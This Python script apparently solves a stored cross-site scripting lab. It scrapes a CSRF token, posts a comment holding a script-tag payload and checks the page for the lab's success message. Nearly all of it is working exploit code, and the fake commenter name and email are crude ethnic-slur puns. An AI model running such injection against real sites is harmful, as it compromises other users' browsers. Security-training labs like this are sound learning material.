import argparse
import logging
import urllib3

import requests
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


log = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

HEADERS = {
    "X-Pwnfox-Color":"blue"
}

PROXIES = {
    "http":"127.0.0.1:8080",
    "https":"127.0.0.1:8080"
}


def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-n","--no-proxy",help="to use no proxy",default=False,action="store_true")
    parser.add_argument("url",help="xss vulnerable url")
    return parser.parse_args()

def extract_csrf(html):
    soup = BeautifulSoup(html, "html.parser")

    csrf_input = soup.find("input", attrs={"name": "csrf"})

    if not csrf_input:
        print("[!] CSRF input not found. Dumping HTML snippet:\n")
        print(html)
        exit(1)

    return csrf_input.get("value")


def exploit(url,no_proxy):

    session = requests.Session()

    if not no_proxy:
        session.proxies.update(PROXIES)

    session.headers.update(HEADERS)

    r = session.get(url + "post?postId=1",verify=False)

    csrf = extract_csrf(r.text)
    log.info(f"extracted CSRF token: f{csrf}")

    payload = {
        "csrf":csrf,
        "postId": 1,
        # "comment": "%3Cscript%3Ealert%28%29%3C/script%3E",
        "comment": "<script>alert()</script>",
        "name": "Captain Sum Ting Wong",
        "email":"HoLeeFuk@WeTooLo.flight",
        "website":""
    }

    log.info("sending payload...")
    r = session.post(url+"/post/comment",data=payload,verify=False)

    r = session.get(url,verify=False)

    if "Congratulations, you solved the lab!" not in r.text:
        r = session.get(url,verify=False)
        if "Congratulations, you solved the lab!" not in r.text:
            log.info("exploit failed!")
        else:
            log.info("stored xss exploited!")
    else:
            log.info("stored xss exploited!")






def normalize_url(url: str):
    if not url.endswith("/"):
        url = url + "/"
        return url
    return url

if __name__ == "__main__":
    args = parse()
    exploit(normalize_url(args.url),args.no_proxy)
